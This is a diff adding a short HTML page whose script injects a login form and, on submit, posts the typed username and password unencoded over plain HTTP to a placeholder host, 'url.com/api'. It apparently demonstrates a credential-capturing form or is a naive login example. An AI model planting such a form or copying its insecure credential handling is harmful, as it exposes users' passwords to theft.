@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+
+<body>
+
+    <script type="text/javascript">
+        var bodyElement = document.querySelector('body');
+        bodyElement.innerHTML += `
+
+        <form>
+            <div>
+              <input name="username" />
+            </div>
+            <div>
+              <input name="password" />
+            </div>
+            <input type="submit" value="Login" />
+
+        </form>`;
+        var formElement = document.querySelector('form');
+
+        formElement.addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            let usernameTextBox = document.querySelector('[name=username]');
+            let passwordTextBox = document.querySelector('[name=password]');
+
+            var request = new XMLHttpRequest();
+            request.open("POST", "http://url.com/api");
+            request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            request.send('username=' + usernameTextBox.value + '&password=' + passwordTextBox.value);
+        });
+    </script>
+
+</body>
+
+</html>
